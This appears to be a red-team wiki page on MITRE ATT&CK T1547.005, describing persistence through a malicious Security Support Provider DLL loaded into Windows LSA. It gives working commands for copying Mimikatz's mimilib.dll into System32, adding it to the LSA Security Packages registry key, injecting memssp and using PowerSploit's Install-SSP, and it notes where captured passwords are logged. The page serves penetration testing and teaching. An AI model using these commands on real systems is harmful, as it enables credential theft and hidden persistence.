---
description: >-
  MITRE ATT&CK™ Boot or Logon Autostart Execution: Security Support Provider -
  Technique T1547.005
---

# Security Support Provider DLLs

## Theory

We may abuse [security support providers (SSPs)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

## Practice

{% hint style="danger" %}
We won't be able to make it work If [LSA protection (RunAsPPL)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#enable-by-using-the-registry) is enabled. Loaded SSP DLLs will have to be signed by Microsoft as LSASS.exe will run as a [Protected Process Light (PPL)](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-#system-protected-process).
{% endhint %}

We may modify LSA Registry keys to add new SSPs which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. The SSP configuration is stored in this two Registry keys:

* `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
* `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages`.&#x20;

{% tabs %}
{% tab title="Mimikatz" %}
The [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases) project provides a DLL file (mimilib.dll) that can be used as a malicious SSP DLL that will log credentials in this file:

```powershell
C:\Windows\System32\kiwissp.log 
```

First, you will have to copy mimilib.dll in System32

```powershell
copy C:\Windows\Temp\mimilib.dll C:\Windows\System32\mimilib.dll
```

Then, edit LSA registry keys to include the new security support provider

```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
```

{% hint style="info" %}
Alternatively Mimikatz support in memory SSP DLL injection to the LSASS process.

```powershell
mimikatz# privilege::debug
mimikatz# misc::memssp
```
{% endhint %}
{% endtab %}

{% tab title="PowerSploit" %}
[PowerSploit](https://attack.mitre.org/software/S0194)'s `Install-SSP` Persistence module can be used to install a SSP DLL.

```powershell
Import-Module .\PowerSploit.psm1
Install-SSP -Path .\mimilib.dll
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://attack.mitre.org/techniques/T1547/005/" %}

{% embed url="https://pentestlab.blog/2019/10/21/persistence-security-support-provider/" %}
